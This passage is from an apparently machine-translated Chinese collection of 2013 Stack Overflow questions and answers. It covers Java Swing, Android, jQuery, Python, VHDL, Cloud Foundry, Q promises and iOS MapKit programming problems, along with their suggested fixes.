            mainPanel_m.removeAll();

            // and populate the panel with other informations, from another class
            mainPanel_m.add(...);
            ...
            ...
        }

        // and then refresh GUI
        this.validate();
        this.repaint();
        this.pack();
    }
} 
```

当 ActionEvent 从“LoginRequest”类发送到“MainApplication”类时，它会执行代码，但最后什么也没发生，就好像 JFrame 没有重新绘制一样。

有任何想法吗 ？

谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T13:15:59.850

最好的方法是使用`JDialog`（主框架`JFrame`将是父组件）登录表单并`CardLayout`在面板之间切换（因此无需删除、重新绘制和重新验证）：

您的主表单应如下所示：

```
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

public class MainFrame{
    JFrame frame = new JFrame("Main frame");

    JPanel welcomePanel = new JPanel();
    JPanel workspacePanel = new JPanel();
    JPanel cardPanel = new JPanel();

    JButton btnLogin = new JButton("Login");
    JLabel lblWelcome = new JLabel("Welcome to workspace");

    CardLayout cl = new CardLayout();

    LoginRequest lr = new LoginRequest(this);

    public MainFrame() {
        welcomePanel.add(btnLogin);
        btnLogin.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                lr.setVisible(true);
            }
        });

        workspacePanel.add(lblWelcome);

        cardPanel.setLayout(cl);
        cardPanel.add(welcomePanel, "1");
        cardPanel.add(workspacePanel, "2");
        cl.show(cardPanel,"1");

        frame.getContentPane().add(cardPanel);
        frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        frame.setPreferredSize(new Dimension(320,240));
        frame.pack();
        frame.setLocationByPlatform(true);
        frame.setVisible(true);
    }

    public static void main(String [] args){
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                new MainFrame();
            }
        });
    }
} 
```

您的登录表单应如下所示：

```
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

public class LoginRequest extends JDialog{
    /**You can add, JTextFields, JLabel, JPasswordField..**/
    JPanel panel = new JPanel();
    JButton btnLogin = new JButton("Login");

    public LoginRequest(final MainFrame mf) {
        setTitle("Login");
        panel.add(btnLogin);
        btnLogin.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                //Put some login logic here
                mf.cl.show(mf.cardPanel,"2");
                dispose();
            }
        });
        add(panel, BorderLayout.CENTER);
        setModalityType(ModalityType.APPLICATION_MODAL);
        setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
        pack();
        setLocationByPlatform(true);
    }
} 
```

**编辑：**

**你的方式：**

主框架类：

```
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

public class MainFrame{
    JFrame frame = new JFrame("Main frame");

    JPanel welcomePanel = new JPanel();
    JPanel workspacePanel = new JPanel();
    JPanel cardPanel = new JPanel();

    JButton btnLogin = new JButton("Login");
    JLabel lblWelcome = new JLabel("Welcome");

    LoginRequest lr = new LoginRequest(this);

    public MainFrame() {
        welcomePanel.add(btnLogin);
        btnLogin.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                lr.setVisible(true);
            }
        });

        workspacePanel.add(lblWelcome);

        frame.getContentPane().add(welcomePanel);
        frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        frame.setPreferredSize(new Dimension(320,240));
        frame.pack();
        frame.setLocationByPlatform(true);
        frame.setVisible(true);
    }

    public static void main(String [] args){
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                new MainFrame();
            }
        });
    }
} 
```

登录请求类：

```
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

public class LoginRequest extends JDialog{
    /**You can add, JTextFields, JLabel, JPasswordField..**/
    JPanel panel = new JPanel();
    JButton btnLogin = new JButton("Login");

    public LoginRequest(final MainFrame mf) {
        setTitle("Login");
        panel.add(btnLogin);
        btnLogin.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                //Put some login logic here
                mf.frame.getContentPane().removeAll();
                mf.frame.add(mf.workspacePanel);
                mf.frame.repaint();
                mf.frame.revalidate();
                dispose();
            }
        });
        add(panel, BorderLayout.CENTER);
        setModalityType(ModalityType.APPLICATION_MODAL);
        setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
        pack();
        setLocationByPlatform(true);
    }
} 
```

# android - 为什么展开/折叠和滚动 ExpandableListView 很慢？

> ID：14916939
> 
> 赞同：0
> 
> 时间：2013-02-17T00:58:12.473
> 
> 标签：android, performance

我有一个`ExpandableListView`正常填充行的字段。但是，其中一个字段是`ImageView`其中图像的路径存储在变量中。问题是扩展/折叠和 scolling 列表视图很慢。展开/折叠大约需要一秒钟。这是正常的吗？有没有办法让它更快？下面的`ImageView`代码是我怀疑它是性能背后的原因的代码（我评论它并且速度是可以接受的）

请让我知道可以做什么。

```
String imagePath = prop.getImagePath();
if (imagePath.length() > 0) {
    Uri mainImgeUri = Uri.parse(imagePath);
    InputStream imageStream;
    try {
        imageStream = mActiviy.getContentResolver().openInputStream(mainImgeUri);
        BitmapFactory.Options options = new BitmapFactory.Options();
        options.inSampleSize = 8;
        Bitmap yourSelectedImage = BitmapFactory.decodeStream(imageStream, null, options);
        holder.mainImage.setImageBitmap(yourSelectedImage);
    } catch (FileNotFoundException e) {
        e.printStackTrace();
    }
} 
```

请注意，变量 prop 是从数据库中获取的，该数据库`imagePath`以字符串形式存储在数据库中。数据库查询甚至在初始化列表之前就发生了，因此它不会影响性能。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T07:14:11.453

我假设这个代码块在`getView()`你的适配器的方法中，由于`holder.main...`. 如果是这样，这是一种糟糕的做法，因为您应该了解这将对每一`ExpandableList`行进行。效果应该在滚动和展开/折叠期间明显，因为`getView()`可能会为所有这些行调用并且这些图像正在被外部检索。

更好的是设置一个集合来保存这些图像，然后一次批量插入它们。然后，您可以使用此图像集合来填充您的可扩展列表。`convertView`如果还没有，也可以考虑使用该技术。

# javascript - 如何使用 getJSON 从文件中获取 JSON 数组？

> ID：14916940
> 
> 赞同：6
> 
> 时间：2013-02-17T00:58:15.003
> 
> 标签：javascript, jquery, arrays, json

如何使用 javascript 和 jquery 获取 json 文件的数组 json

我正在尝试使用下一个代码，但它不起作用：

```
var questions = [];
function getArray(){
    $.getJSON('questions.json', function (json) {
        for (var key in json) {
            if (json.hasOwnProperty(key)) {
                var item = json[key];
                questions.push({
                    Category: item.Category
                });
            }
        }
        return questions;
    })
} 
```

这是名为的 json 文件： questions.json

```
{
"Biology":{
    "Category":{
        "cell":{
            "question1":{
                "que1":"What is the cell?"
            },
            "option1":{
                "op1":"The cell is the basic structural and functional unit",
                "op2":"is a fictional supervillain in Dragon Ball"
            },
            "answer1":"opt1"
        }
    }
},
"Astronomy":{
    "Category":{
        "Mars":{
            "question1":{
                "que1":"How many moons does Mars?"
            },
            "option1":{
                "op1":"5",
                "op2":"2"
            },
            "answer1":"opt2"
        }
    }
}
} 
```

我想得到一个具有这种格式的数组 {Biology:{Category:{cell:{question1....}}}}

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-02-17T01:15:01.843

`$.getJSON`是一个异步函数，因此在该函数中返回一些东西什么都不做，因为它不在范围内，或者尚未接收。您可能应该执行以下操作：

```
function getArray(){
    return $.getJSON('questions.json');
}

getArray().done(function(json) {
    // now you can use json
    var questions = [];
    $.each(json, function(key, val) {
        questions[key] = { Category: val.Category };
    });
}); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-17T01:00:23.263

循环中的条件`for`可防止将任何内容添加到数组中。相反，检查您的 json 对象是否具有该属性，然后获取该值并将其添加到您的数组中。换句话说：

`if (questions.hasOwnProperty(key))`应该`if (json.hasOwnProperty(key))`

此外，您不能简单地`return`得到这样的 AJAX 调用的结果，因为该方法是异步运行的。这`return`实际上应用于内部`success`函数回调，而不是`getArray`. 您必须使用回调模式才能仅在收到数据后才传递数据，并相应地对其进行操作。

（当然，由于数组是在外部范围内定义的，因此您无论如何都不必返回它，但如果您在 AJAX 方法结束之前尝试使用它，它将为空。）

假设您要使用名为的方法将其渲染到 DOM `renderJSON`：

```
var questions = [];
function getArray(){
    $.getJSON('questions.json', function (json) {
        for (var key in json) {
            if (json.hasOwnProperty(key)) {
                var item = json[key];
                questions.push({
                    Category: item.Category
                });
            }
        }
        renderJSON(questions);
    });
} 
```

# algorithm - 在 Python 中绘制六边形镶嵌动画

> ID：14916941
> 
> 赞同：4
> 
> 时间：2013-02-17T00:58:35.727
> 
> 标签：algorithm, animation, python-2.7, hexagonal-tiles

现在我有一个名为 Hexagon(x,y,n) 的函数，它将在 python 窗口中绘制一个以 (x,y) 为中心且边长为 n 的六边形。

我的目标是绘制一个曲面细分动画，它将从屏幕中心**一个接一个地绘制六边形并一个一个展开（作为我附在此处的图片**[http://s7.postimage.org/lu6qqq2a3/Tes.jpg](http://s7.postimage.org/lu6qqq2a3/Tes.jpg)）。

我正在寻找解决这个问题的算法。刚接触编程，我发现很难做到这一点。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T19:43:54.580

对于一圈六边形，可以定义如下函数：

```
def HexagonRing(x,y,n,r):
    dc = n*math.sqrt(3) # distance between to neighbouring hexagon centers
    xc,yc = x,y-r*dc # hexagon center of one before first hexagon (=last hexagon)
    dx,dy = -dc*math.sqrt(3)/2,dc/2 # direction vector to next hexagon center
    for i in range(0,6):
        # draw r hexagons in line
        for j in range(0,r):
            xc,yc = xc+dx,yc+dy
            Hexagon(xc,yc,n)
        # rotate direction vector by 60°
        dx,dy = (math.cos(math.pi/3)*dx+math.sin(math.pi/3)*dy,
               -math.sin(math.pi/3)*dx+math.cos(math.pi/3)*dy) 
```

然后可以一个接一个地画一个环：

```
Hexagon(0,0,10)
HexagonRing(0,0,10,1)
HexagonRing(0,0,10,2)
HexagonRing(0,0,10,3) 
```

# apache - 邮件失败-被本地扫码拒绝

> ID：14916943
> 
> 赞同：1
> 
> 时间：2013-02-17T00:59:05.397
> 
> 标签：apache, cpanel, whm

我从我的服务器发送邮件 ip 是全新的并且经过测试。我发送的邮件是 html 邮件，但在我的网络邮件中没有收到一封邮件我收到此错误

您发送的消息被用于检查此系统上的传入消息的本地扫描代码拒绝。给出了以下错误：

此邮件被归类为垃圾邮件，可能无法投递

------ 这是您的邮件的副本，包括所有标题。------

我尝试禁用 spamassisn 但没有运气。

我到处搜索 whm 调整设置做了几处更改，但所有邮件都进入，甚至垃圾邮件都被服务器拒绝

# mongodb - mongoDB 作为 Grails 应用程序的文件存储

> ID：14916944
> 
> 赞同：3
> 
> 时间：2013-02-17T00:59:07.163
> 
> 标签：mongodb, grails, gridfs

我最近遇到了在我的应用程序中存储更多文件的需求，并且因为用于托管应用程序的 PaaS 平台提供了 mongo，所以我想使用它。

但是，因为我对 mongo 非常缺乏经验，所以我几乎不知道与 mongo 相关的 grails 插件和工具的当前状态是什么。我应该使用什么？由于我想将域类保留在 SQL 数据库中并仅使用 mongo 来存储相关文件（在这种情况下，它主要是一堆与域实例相关的 PDF 和文本文档），mongoDB ORM [1] 插件似乎太“重” . 不幸的是，mongoDB ORM 可能是目前活跃开发中唯一用于 grails 的 mongo 插件。

简而言之，为此目的最好的插件/库工具集是什么？我发现最符合我需要的是 grails-mongo-files 插件 [2]，它可能有点过时，没有进一步的开发。到目前为止，我似乎必须使用 mongo 的 java 驱动程序（或gmongo 包装器）并自己编写一些存储服务和标记库（这不是一件坏事）。

[1] [http://grails.org/plugin/mongodb](http://grails.org/plugin/mongodb)

[2] [https://github.com/quirklabs/grails-mongo-file](https://github.com/quirklabs/grails-mongo-file)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T21:35:41.037

还有 mongodb gridfs 插件。[http://grails.org/plugin/mongodb-gridfs](http://grails.org/plugin/mongodb-gridfs)

需要考虑的一件事是 gridfs 有效地对 mongo 进行了两次调用，一次检索文件信息，一次检索文件。因此，如果您的文件小于 16 兆字节，它可能不太适合。

如果您想绕过插件，这是一篇关于如何手动执行此操作的帖子 - [http://jameswilliams.be/blog/entry/171](http://jameswilliams.be/blog/entry/171)

# windows - Simulink 加速器模式。墨西哥错误

> ID：14916950
> 
> 赞同：0
> 
> 时间：2013-02-17T00:59:43.977
> 
> 标签：windows, matlab, simulink, mex

我正在尝试在“加速器”模式下运行 Simulink 模型。当我开始模拟时，它开始编译东西我得到这个错误：

> ### 编译 xxxxxxxxxx_acc.c
> C:\Program Files\MATLAB\R2011a\bin\mex -c -win32 OPTIMFLAGS="/Od /Oy- /DNDEBUG" -f C:\Users\Gui\AppData\Roaming\MATHWO~ 1\MATLAB\R2011a\mexopts.bat xxxxxxxxxx_acc.c
> 'C:\Program' 不是内部或外部命令、可运行程序或批处理文件。
> NMAKE：致命错误 U1077：“C:\Program”：返回代码“0x1”
> 停止。

似乎“程序文件”中的空间是罪魁祸首。

任何人都知道如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T01:20:45.363

Wrap the path in quotes:

```
"C:\Program Files\MATLAB\R2011a\bin\mex" -c  -win32  OPTIMFLAGS="/Od /Oy- /DNDEBUG"  -f C:\Users\Gui\AppData\Roaming\MATHWO~1\MATLAB\R2011a\mexopts.bat  xxxxxxxxxx_acc.c 
```

# vhdl - 类型错误中缀表达式 VHDL

> ID：14916952
> 
> 赞同：0
> 
> 时间：2013-02-17T00:59:54.507
> 
> 标签：vhdl

我正在用 VHDL 编写一个基本组合电路，它有一个带有两个输入 a 和 b 的与门。这个“t”的输出与否定的输入“c”进行或运算。然后这个输出“s”与“a”进行与非，得到最终输出“d”。

这是代码。

```
library ieee;
use ieee.std_logic_1164.all;
entity logicgate is
port(a,b,c: in std_logic;
d: out std_logic);
end logicgate;

architecture arch_logicgate of logicgate is
begin
signal s: std_logic;
signal t: std_logic;
t<= a and b;
s<= (not c) or t;
d<= a nand s;
end arch_logicgate; 
```

成绩单：

```
-- 编译逻辑门的架构arch_logicgate
# ** 错误：C:/Modeltech_pe_edu_10.1d/examples/logicgate.vhdl(12): near "signal": 语法错误
# ** 错误：C:/Modeltech_pe_edu_10.1d/examples/logicgate.vhdl(14): (vcom-1136) 未知标识符“s”。
#
# ** 错误：C:/Modeltech_pe_edu_10.1d/examples/logicgate.vhdl(14)：类型错误将中缀表达式“nand”解析为类型 ieee.std_logic_1164.STD_LOGIC。
# ** 错误：C:/Modeltech_pe_edu_10.1d/examples/logicgate.vhdl(15): VHDL 编译器退出

```

我知道我错过了基础知识。请帮帮我。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-17T01:16:17.430

第一条错误消息：

```
** Error: C:/Modeltech_pe_edu_10.1d/examples/logicgate.vhdl(12): near "signal": syntax error 
```

出现是因为执行区域中有声明。

将它们放在声明区域中，之前`begin`

```
architecture arch_logicgate of logicgate is
   signal s: std_logic;
begin
   ... 
```

# python - 乘以相邻元素

> ID：14916957
> 
> 赞同：3
> 
> 时间：2013-02-17T01:01:08.343
> 
> 标签：python, tuples, multiplication

我有一个整数元组，`(1, 2, 3, 4, 5)`我想`(1*2, 2*3, 3*4, 4*5)`通过将相邻元素相乘来产生元组。可以用单线做到这一点吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-02-17T01:13:14.887

短而甜。请记住，`zip`只有最短的输入才能运行。

```
print tuple(x*y for x,y in zip(t,t[1:])) 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-02-17T01:04:52.650

```
>>> t = (1, 2, 3, 4, 5)
>>> print tuple(t[i]*t[i+1] for i in range(len(t)-1))
(2, 6, 12, 20) 
```

虽然不是最pythonic的解决方案。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-02-17T01:06:59.517

如果 t 是你的元组：

```
>>> tuple(t[x]*t[x+1] for x in range(len(t)-1))
(2, 6, 12, 20) 
```

另一个带有可爱地图​​的解决方案：

```
>>> tuple(map(lambda x,y:x*y, t[1:], t[:-1]))
(2, 6, 12, 20) 
```

编辑：如果您担心切片的额外内存消耗，您可以使用 itertools 中的 islice，它将遍历您的元组（thx @eyquem）：

```
>>> tuple(map(lambda x,y:x*y, islice(t, 1, None), islice(t, 0, len(t)-1)))
(2, 6, 12, 20) 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-02-17T01:23:24.203

```
tu = (1, 2, 3, 4, 5)

it = iter(tu).next
it()
print tuple(a*it() for a in tu) 
```

我计时了各种代码：

```
from random import choice
from time import clock
from itertools import izip

tu = tuple(choice(range(0,87)) for i in xrange(2000))

A,B,C,D = [],[],[],[]

for n in xrange(50):

    rentime = 100

    te = clock()
    for ren in xrange(rentime): # indexing
        tuple(tu[x]*tu[x+1] for x in range(len(tu)-1))
    A.append(clock()-te)

    te = clock()
    for ren in xrange(rentime): # zip
        tuple(x*y for x,y in zip(tu,tu[1:]))
    B.append(clock()-te)

    te = clock()
    for ren in xrange(rentime): #i ter
        it = iter(tu).next
        it()
        tuple(a*it() for a in tu)
    C.append(clock()-te)

    te = clock()
    for ren in xrange(rentime): # izip
        tuple(x*y for x,y in izip(tu,tu[1:]))
    D.append(clock()-te)

print 'indexing ',min(A)
print 'zip      ',min(B)
print 'iter     ',min(C)
print 'izip     ',min(D) 
```

结果

```
indexing  0.135054036197
zip       0.134594201218
iter      0.100380634969
izip      0.0923947037962 
```

izip 比 zip 好：- 31 %

我的解决方案还不错（顺便说一句，我不这么认为）：-25% 相对于 zip，比冠军 izip 多 10% 的时间

我很惊讶索引并不比 zip 快：nneonneo 是正确的， zip 是可以接受的

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-02-17T01:19:17.757

我喜欢以下[食谱`itertools`](http://docs.python.org/2.7/library/itertools.html#recipes)：

```
from itertools import izip, tee

def pairwise(iterable):
    xs, ys = tee(iterable)
    next(ys)
    return izip(xs, ys)

print [a * b for a, b in pairwise(range(10))] 
```

结果：

```
[0, 2, 6, 12, 20, 30, 42, 56, 72] 
```

# java - 演员表是糟糕设计的标志吗？

> ID：14916961
> 
> 赞同：-4
> 
> 时间：2013-02-17T01:01:24.927
> 
> 标签：java, design-patterns, casting

我有这种情况：

```
public abstract class ClassA{

    public ClassA getClassOfSameKind(){
        return this.getClass().newInstance();
    }

}

public abstract class ClassB extends ClassA{

    public void doSomethingSpecial(){
        ClassB otherClass = (ClassB) this.getClassOfSameKind();
        //do something special that only Class B can do
    }

} 
```

你会做不同的事情吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T01:11:19.083

使用协变返回类型可以避免这种强制转换：

```
public abstract class ClassA{

    public abstract ClassA getClassOfSameKind();

}

public abstract class ClassB extends ClassA{

    @Override
    public abstract ClassB getClassOfSameKind();

    public void doSomethingSpecial(){
        ClassB otherClass = this.getClassOfSameKind();
        //do something special that only Class B can do
    }

}

public class ClassC extends ClassB {
    @Override
    public ClassC getClassOfSameKind() {
        return new ClassC();
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-17T01:11:36.753

如果你想避免这种类型转换，那么你可以这样写：

```
public void doSomethingSpecial(){
    ClassB otherClass = this.getClass().newInstance();
    // ...
} 
```

...或其他方式。

但老实说，除非代码包含对需要类型转换的方法*的大量*调用，否则我不会打扰。`getClassOfSameKind()`

* * *

> 演员表是糟糕设计的标志吗？

IMO，不。当然，一般来说不是。

在某些情况下，尤其是当类型转换硬连线假设某个对象具有特定类型而没有可靠的基础时。例如：

```
private ClassB otherB;

public void setOther(ClassA other) {
    this.otherB = (ClassB) otherB;  // It's always a ClassB.  She'll be right ...
} 
```

# node.js - vmc push Errno::ENOENT: 没有这样的文件或目录

> ID：14916967
> 
> 赞同：1
> 
> 时间：2013-02-17T01:02:36.183
> 
> 标签：node.js, smtp, npm, cloud-foundry, nodemailer

我正在尝试将此示例部署到 Cloud Foundry

[https://github.com/andris9/Nodemailer/blob/master/examples/example_smtp.js](https://github.com/andris9/Nodemailer/blob/master/examples/example_smtp.js)

这是我所做的：

1.  `npm install nodemailer`
2.  重命名`example_smtp.js`和`app.js`编辑正确电子邮件凭据的字段
3.  在本地测试`node app.js`，它可以工作/发送电子邮件
4.  `vmc push`并得到以下错误

> 上传 mytestmailer... FAILED 上传失败。使用“vmc push”重试。Errno::ENOENT: 没有这样的文件或目录 - C:/Users/username/AppData/Local/Temp/。vmc_hocmailer_files/node_modules/nodemailer/node_modules/simplesmtp/node_modules /xoauth2/node_modules/request/node_modules/form-data/node_modules/combined-strea m/node_modules/delayed-stream/test/integration/test-delayed-http-upload.js有关详细信息，请参阅 ~/.vmc/crash

我搜索并找到了这个线程来弄清楚里面有什么`~/.vmc/crash`

[如何访问 Cloud Foundry 上的 ~/.vmc/crash 文件夹](https://stackoverflow.com/questions/14743288/how-to-access-vmc-crash-folder-on-cloud-foundry)

但我使用的是**Windows**，所以我找不到那个崩溃文件。

有人可以帮我解决这个问题吗？似乎是一个简单的部署。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-18T17:12:30.173

您需要确保创建一个 package.json 文件来指定应用程序的依赖项，在这种情况下，它应该看起来像这样；

```
{
  "name": "node-mailer-example",
  "version": "0.0.1",
  "dependencies": {
    "nodemailer": "*"
  }
} 
```

文件夹中只有 this 和 app.js ，使用 npm 安装应用程序的依赖项；

```
npm install 
```

这应该创建一个新的“node_modules”文件夹，其中包含依赖项。

此外，您需要更改 app.js 文件的第一行，以便读取；

```
var nodemailer = require('nodemailer'); 
```

我这样做了，它部署好了，我在应用程序日志中收到了这条消息；

```
SMTP Configured
Sending Mail
Error occured
Invalid login - 535-5.7.1 Please log in with your web browser and then try again. Learn more at
535 5.7.1 https://support.google.com/mail/bin/answer.py?answer=78754 hr1sm24898342qeb.3 - gsmtp 
```

顺便说一句，当您通过 gMail 批量发送邮件时，每封电子邮件都有相同的内容，gMail 最终会要求您通过 Web 界面登录才能继续。

# javascript - 使用 node.js + Q deferred/promises 模块从同步回调中 创建一个同步循环

> ID：14916968
> 
> 赞同：4
> 
> 时间：2013-02-17T01:02:44.007
> 
> 标签：javascript, node.js, loops, q

流行的 JavaScript 模块[Q](http://documentup.com/kriskowal/q/)实现了延迟/承诺/期货概念。我认为它主要与 node.js 一起使用，但它也支持浏览器使用。我将它与 node.js 一起使用。

要进行顺序调用，您将一个承诺链接到下一个使用`then()`，但在一个循环中，它可能非常违反直觉，我发现很难像这个伪代码一样做同样的事情：

```
forever {
    l = getline();

    if (l === undefined) {
        break;
    } else {
        doStuff(l);
    }
} 
```

Q 文档包含一个看起来非常相似的示例：

```
var funcs = [foo, bar, baz, qux];

var result = Q.resolve(initialVal);
funcs.forEach(function (f) {
    result = result.then(f);
});
return result; 
```

但是在尝试多种方法来使这个例子适应我的问题时，我根本没有成功。

与示例代码不同，我不是遍历数组而是希望循环直到满足结束条件。我也总是调用相同的函数。我的函数不会将先前的结果作为下一次调用的参数。每个调用都没有参数，但返回值决定是否继续循环。

这些看似微不足道的差异，却造成了某种难以逾越的心理障碍。现在我明白为什么很多人难以理解承诺了。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-17T03:48:00.297

要记住的关键是，如果你从`then`回调中返回一个 Promise，那么它将替换现有的 Promise。这个想法是，在循环体中执行你想要做的任何事情链的一次迭代之后，你要么返回一个值，这将解决这个承诺，要么你返回一个新的承诺，它将再次执行循环体。

```
function iterateUntil(endValue){
  // This line would eventually resolve the promise with something matching
  // the final ending condition.
  return Q.resolve('some value')
    .then(function(value){
      // If the promise was resolved with the loop end condition then you just
      // return the value or something, which will resolve the promise.
      if (value == endValue) return value;

      // Otherwise you call 'iterateUntil' again which will replace the current
      // promise with a new one that will do another iteration.
      else return iterateUntil(endValue);
    });
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-03T11:36:39.530

这不是特定于 Q: [Synchronous for loop](https://gist.github.com/steve-taylor/5075717 "同步for循环")。

# iphone - 类似于 MKUserLocation 动画的 iOS 自定义 MKAnnotation 对象

> ID：14916974
> 
> 赞同：3
> 
> 时间：2013-02-17T01:03:55.397
> 
> 标签：iphone, ios, objective-c, mkmapview, mkannotation

我想`MKAnnotationView`在地图上放置图钉并让图钉像动画一样进行`MKUserLocation`动画处理（带有圆形波的蓝点出现）

你如何实现这种类型的动画？我需要采取哪些步骤？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-17T10:11:23.147

# 像任何 UIView 一样对其进行动画处理！

自定义内容的子类 MKAnnotationView。**不要通过重复的 addAnnotation 调用来动画它！那是错的**

您可以像对待任何其他视图一样对待 annotationView..

这是一些具有图像闪烁动画的代码-此代码应该可以帮助您入门。

（不漂亮，但你的情况需要的确切东西！）

```
#import "DDViewController.h"
#import <MapKit/MapKit.h>
#import <QuartzCore/QuartzCore.h>

@interface DummyAnnotation : NSObject<MKAnnotation>
@end
@implementation DummyAnnotation
- (CLLocationCoordinate2D)coordinate { return CLLocationCoordinate2DMake(51, 10); }
- (NSString *)title { return @"Dummy"; }
@end

@interface DummyAnnotationView : MKAnnotationView
@end
@implementation DummyAnnotationView
- (id)initWithAnnotation:(id <MKAnnotation>)annotation reuseIdentifier:(NSString *)reuseIdentifier {
    self = [super initWithAnnotation:annotation reuseIdentifier:reuseIdentifier];

    UIImageView *imageView = [[UIImageView alloc] initWithFrame:CGRectZero];
    imageView.autoresizingMask = UIViewAutoresizingFlexibleHeight|UIViewAutoresizingFlexibleWidth;
    imageView.animationImages = @[[UIImage imageNamed:@"1.gif"],[UIImage imageNamed:@"2.gif"]];
    imageView.animationDuration = 5;
    [imageView startAnimating];
    [self addSubview:imageView];

    return self;
}
@end

@interface DDViewController() <MKMapViewDelegate>
@end
@implementation DDViewController

- (MKMapView*)mapView {
    return (MKMapView*)self.view;
}

- (void)viewDidLoad
{
    [super viewDidLoad];

    //init a region
    MKCoordinateRegion region = MKCoordinateRegionMake(CLLocationCoordinate2DMake(51.0, 10.0), MKCoordinateSpanMake(2.0, 2.0));
    [self.mapView setRegion:region animated:NO];

    //add a dumy pin
    DummyAnnotation *ann = [[DummyAnnotation alloc] init];
    [self.mapView addAnnotation:ann];
}

- (MKAnnotationView *)mapView:(MKMapView *)mapView viewForAnnotation:(id<MKAnnotation>)annotation {
    if([annotation isKindOfClass:[DummyAnnotation class]]) {
        DummyAnnotationView *view = (id)[mapView dequeueReusableAnnotationViewWithIdentifier:@"animated"];
        if(!view)
            view =[[DummyAnnotationView alloc ] initWithAnnotation:annotation reuseIdentifier:@"animated"];
        view.bounds = CGRectMake(0, 0, 59, 59);
        view.backgroundColor = [UIColor purpleColor];

        //
        //Animate it like any UIView!
            //

        CABasicAnimation *theAnimation;

        //within the animation we will adjust the "opacity"
        //value of the layer
        theAnimation=[CABasicAnimation animationWithKeyPath:@"opacity"];             
            //animation lasts 0.4 seconds
        theAnimation.duration=0.4;
        //and it repeats forever
        theAnimation.repeatCount= HUGE_VALF;
        //we want a reverse animation
        theAnimation.autoreverses=YES;
        //justify the opacity as you like (1=fully visible, 0=unvisible)
        theAnimation.fromValue=[NSNumber numberWithFloat:1.0];
        theAnimation.toValue=[NSNumber numberWithFloat:0.1];

        //Assign the animation to your UIImage layer and the 
        //animation will start immediately
        [view.layer addAnimation:theAnimation forKey:@"animateOpacity"];

        return view;
    }
    return nil;
}

//---

@end 
```

将工作示例上传到我的保管箱（它最终会消失，但上面的代码只是图像资源和 iOS 应用程序的默认样板代码）:: [https://dl.dropbox.com/u/3753090/test 。压缩](https://dl.dropbox.com/u/3753090/test.zip)

# javascript - 我可以在一个类中转义 html 标签（重新创建 xmp 标签）吗？

> ID：14916975
> 
> 赞同：0
> 
> 时间：2013-02-17T01:04:02.643
> 
> 标签：javascript, html, escaping, markdown, xmp

思考这个问题的几种方法。自己决定哪个对你最有用……</p>

*   javascript 可以使用“xmp”类重新创建已弃用的 <xmp> 标记吗？
*   我们可以在内联代码中模仿 SO 的降价处理器的转义标签吗？
*   （metaSO，我承认） SO 的 md 处理器如何在内联代码中转义标签？
*   我们可以在 HTML 中嵌入的 markdown 代码块中转义 < 吗？

目标：一个逃逸的类`<`，允许该类包含文本<html>、<body>、<head>、<script>、<style>、<body>，以及任何其他不属于< body> 或经过特殊处理，*无需*特殊处理。

<xmp> 实现了这一点（实际上继续 - 已弃用但仍受浏览器支持）：`<xmp><body></xmp>`就像`&lt;body&gt;`. SO 的降价处理器在内*联代码中*实现了这一点：显示`<body>`只需写 `<body>`（它本身就是 \`<body>\` 并且*不能*包含在 SO 代码块中……我不是唯一可以使用的人这个 ;）

到目前为止，我的解决方案（全部`<`替换`&lt;`为）处理了不太特殊的 HTML 标记（这些在 <body> 内的静态内容标记有名称吗？<div>、<code>、<span> 等），但是“特殊”标签仍然必须以 < 开头 而不是 <

```
Javascript:
xmps = document.getElementsByClassName('xmp');
for (var i = 0; i < xmps.length; i++) {
    var xmp = xmp.item(i);
    var newhtml = xmp.innerHTML.replace(/\&gt;/g,"\>").replace(/\&lt;/g,"\<");
    xmp.innerHTML = newhtml;
    } 
```

这样我就可以写了`<div class="xmp">&lt;body></div>`。

什么将允许

`<div class="xmp"><body></div>`?

或者怎么样？

```
<div class="xmp">
    <body>
    &/div>
</div> 
```

我的项目的细节可能很重要：会有降价，`class="xmp"`所以我们需要小心 line-initial `>`。没有用户输入，因此安全性不是（？）问题。我希望有一个不使用 jQuery 的解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T08:36:31.583

您无法`xmp`使用 JavaScript 创建功能，因为该功能与 HTML 解析有关。当 JavaScript 可以处理该元素时，浏览器已经解析了该元素。

